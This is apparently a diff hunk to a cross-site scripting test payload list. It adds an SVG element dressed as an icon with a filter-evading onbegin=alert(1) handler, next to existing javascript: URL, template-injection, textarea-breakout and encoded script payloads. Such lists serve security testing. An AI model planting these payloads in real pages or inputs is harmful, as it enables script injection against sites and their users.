@@ -7,3 +7,4 @@ javascript:alert(1)
 {{7*7}}
 </textarea><script>alert(1)</script>
 %3Cscript%3E
+<svg class="icon" aria-hidden="true" focusable="false" viewBox="0 0 24 24" data-icon="alert-error" fill="none" stroke="currentColor"/onbegin=alert(1)>
